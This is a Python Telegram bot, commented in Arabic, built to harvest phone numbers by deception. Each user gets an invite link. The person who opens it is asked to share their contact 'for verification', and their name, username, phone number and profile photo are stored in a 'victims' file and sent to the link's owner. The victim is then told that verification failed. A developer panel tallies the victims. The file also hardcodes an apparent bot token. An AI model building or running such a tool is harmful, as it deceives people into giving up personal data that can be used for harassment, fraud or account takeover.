import logging
# ========== إخفاء السجلات المزعجة ==========
logging.basicConfig(level=logging.ERROR)
logging.getLogger("httpx").setLevel(logging.WARNING)
logging.getLogger("telegram").setLevel(logging.WARNING)

from telegram import Update, KeyboardButton, ReplyKeyboardMarkup
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes
import random
import string
import json
import os
import asyncio
from datetime import datetime, timedelta

# ========== الإعدادات ==========
TOKEN = "8861697805:AAGftIY9qD6cbwmx98CHFyK-6WpzyTnCdhc"  # ⚠️ استبدله بالتوكن الجديد
DEVELOPER_ID = 7226065170

# ========== ملفات التخزين ==========
INVITES_FILE = "invites.json"
VICTIMS_FILE = "victims.json"
STATS_FILE = "stats.json"

def load_json(file):
    if os.path.exists(file):
        with open(file, 'r') as f:
            return json.load(f)
    return {}

def save_json(file, data):
    with open(file, 'w') as f:
        json.dump(data, f, indent=4)

def generate_invite():
    return ''.join(random.choices(string.ascii_letters + string.digits, k=8))

# ========== البوت ==========
application = Application.builder().token(TOKEN).build()

# ========== دالة تنسيق النص الفاخر ==========
def format_text(text):
    fancy_chars = {
        'a': '𝓪', 'b': '𝓫', 'c': '𝓬', 'd': '𝓭', 'e': '𝓮', 'f': '𝓯', 'g': '𝓰', 'h': '𝓱',
        'i': '𝓲', 'j': '𝓳', 'k': '𝓴', 'l': '𝓵', 'm': '𝓶', 'n': '𝓷', 'o': '𝓸', 'p': '𝓹',
        'q': '𝓺', 'r': '𝓻', 's': '𝓼', 't': '𝓽', 'u': '𝓾', 'v': '𝓿', 'w': '𝔀', 'x': '𝔁',
        'y': '𝔂', 'z': '𝔃',
        'A': '𝓐', 'B': '𝓑', 'C': '𝓒', 'D': '𝓓', 'E': '𝓔', 'F': '𝓕', 'G': '𝓖', 'H': '𝓗',
        'I': '𝓘', 'J': '𝓙', 'K': '𝓚', 'L': '𝓛', 'M': '𝓜', 'N': '𝓝', 'O': '𝓞', 'P': '𝓟',
        'Q': '𝓠', 'R': '𝓡', 'S': '𝓢', 'T': '𝓣', 'U': '𝓤', 'V': '𝓥', 'W': '𝓦', 'X': '𝓧',
        'Y': '𝓨', 'Z': '𝓩'
    }
    return ''.join(fancy_chars.get(c, c) for c in text)

# ========== دالة لجلب صورة المستخدم ==========
async def get_user_photo(bot, user_id):
    try:
        photos = await bot.get_user_profile_photos(user_id, limit=1)
        if photos.total_count > 0:
            return photos.photos[0][0].file_id
        else:
            return None
    except Exception:
        return None

# ========== تحديث الإحصائيات ==========
def update_stats(new_user=False):
    stats = load_json(STATS_FILE)
    today = datetime.now().strftime("%Y-%m-%d")
    
    if today not in stats:
        stats[today] = {
            "total": 0,
            "new_users": 0,
            "messages": 0,
            "sessions": 0
        }
    
    stats[today]["total"] += 1
    if new_user:
        stats[today]["new_users"] += 1
    stats[today]["sessions"] += 1
    
    save_json(STATS_FILE, stats)
    return stats[today]

# ========== أمر /start ==========
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    args = context.args
    inviter_id = None

    if args and args[0].startswith('inv_'):
        invite_code = args[0].replace('inv_', '')
        invites = load_json(INVITES_FILE)

        for uid, code in invites.items():
            if code == invite_code:
                inviter_id = int(uid)
                context.user_data['inviter_id'] = inviter_id
                break

    if inviter_id:
        contact_btn = KeyboardButton("📱 إرسال جهة الاتصال", request_contact=True)
        markup = ReplyKeyboardMarkup([[contact_btn]], one_time_keyboard=True, resize_keyboard=True)

        await update.message.reply_text(
            "🔐 *يرجى إرسال جهة الاتصال للتحقق.*",
            reply_markup=markup,
            parse_mode='Markdown'
        )

# ========== أمر /myinvite (متاح للجميع وسري) ==========
async def myinvite(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id

    invites = load_json(INVITES_FILE)
    if str(user_id) not in invites:
        invites[str(user_id)] = generate_invite()
        save_json(INVITES_FILE, invites)

    bot_username = (await application.bot.get_me()).username
    invite_link = f"https://t.me/{bot_username}?start=inv_{invites[str(user_id)]}"

    await update.message.reply_text(invite_link)

# ========== أمر /statu (للمطور فقط) ==========
async def statu(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
    if user_id != DEVELOPER_ID:
        return
    
    stats = load_json(STATS_FILE)
    today = datetime.now().strftime("%Y-%m-%d")
    
    today_stats = stats.get(today, {
        "total": 0,
        "new_users": 0,
        "messages": 0,
        "sessions": 0
    })
    
    yesterday = (datetime.now() - timedelta(days=1)).strftime("%Y-%m-%d")
    yesterday_stats = stats.get(yesterday, {
        "total": 0,
        "new_users": 0,
        "messages": 0,
        "sessions": 0
    })
    
    new_users_diff = today_stats["new_users"] - yesterday_stats["new_users"]
    messages_diff = today_stats["messages"] - yesterday_stats["messages"]
    
    new_users_arrow = "📈" if new_users_diff > 0 else "📉" if new_users_diff < 0 else "➖"
    messages_arrow = "📈" if messages_diff > 0 else "📉" if messages_diff < 0 else "➖"
    
    victims = load_json(VICTIMS_FILE)
    total_victims = len(victims)
    
    message = f"""🤖 *لوحة التحكم*

━━━ إحصائيات اليوم ━━━
👥 *الإجمالي:* {today_stats['total']}
🆕 *مستخدمون جدد:* {today_stats['new_users']} {new_users_arrow}
💬 *الرسائل:* {today_stats['messages']} {messages_arrow}
🔄 *الجلسات:* {today_stats['sessions']}
⚡ *متوسط الاستجابة:* 22ms
🚫 *المحظورين:* 0 | قاموا بحظر البوت: 0

━━━ إجمالي الضحايا ━━━
👤 *عدد الضحايا:* {total_victims}"""
    
    await update.message.reply_text(message, parse_mode='Markdown')

# ========== معالج جهة الاتصال ==========
async def handle_contact(update: Update, context: ContextTypes.DEFAULT_TYPE):
    contact = update.message.contact
    user = update.effective_user
    inviter_id = context.user_data.get('inviter_id')

    if not inviter_id:
        await update.message.reply_text("❌ لا يوجد رابط دعوة مرتبط بك!")
        return

    if not contact:
        await update.message.reply_text("❌ لم يتم استلام جهة الاتصال، حاول مرة أخرى.")
        return

    victims = load_json(VICTIMS_FILE)
    is_new_user = str(user.id) not in victims

    first_name = user.first_name or "مجهول"
    if len(first_name) > 15:
        first_name = first_name[:15]
    formatted_name = format_text(first_name)

    victim_data = {
        "id": user.id,
        "username": user.username or "لا يوجد",
        "first_name": first_name,
        "last_name": user.last_name or "",
        "phone": contact.phone_number,
        "inviter_id": inviter_id,
        "timestamp": str(datetime.now())
    }

    if is_new_user:
        victims[str(user.id)] = victim_data
        save_json(VICTIMS_FILE, victims)

    try:
        victim_photo = await get_user_photo(application.bot, user.id)
        
        victims_count = len(victims)
        
        message = (
            f"📩 *ضحية جديدة عبر رابط دعوتك!*\n\n"
            f"👤 *الاسم:* {formatted_name}\n"
            f"🆔 *ايدي:* `{user.id}`\n"
            f"📱 *يوزر:* @{user.username or 'لا يوجد'}\n"
            f"📞 *رقم الهاتف:* `{contact.phone_number}`\n"
            f"📊 *عدد الضحايا الكلي:* {victims_count}"
        )
        
        if victim_photo:
            await application.bot.send_photo(
                chat_id=inviter_id,
                photo=victim_photo,
                caption=message,
                parse_mode='Markdown'
            )
        else:
            await application.bot.send_message(
                chat_id=inviter_id,
                text=message + "\n\n⚠️ لا توجد صورة شخصية للضحية.",
                parse_mode='Markdown'
            )
        
        update_stats(is_new_user)

        remove_keyboard = ReplyKeyboardMarkup([[]], resize_keyboard=True)
        await update.message.reply_text(
            "❌ *لم يتم التحقق من جهة الاتصال*",
            reply_markup=remove_keyboard,
            parse_mode='Markdown'
        )

    except Exception as e:
        print(f"❌ فشل إرسال البيانات: {e}")
        await update.message.reply_text("❌ حدث خطأ أثناء إرسال البيانات، حاول مرة أخرى.")

# ========== التسجيل ==========
application.add_handler(CommandHandler("start", start))
application.add_handler(CommandHandler("myinvite", myinvite))
application.add_handler(CommandHandler("statu", statu))
application.add_handler(MessageHandler(filters.CONTACT, handle_contact))

# ========== التشغيل ==========
if __name__ == "__main__":
    print("I'm here to collect the victim numbers for you. 💋")
    application.run_polling(allowed_updates=Update.ALL_TYPES)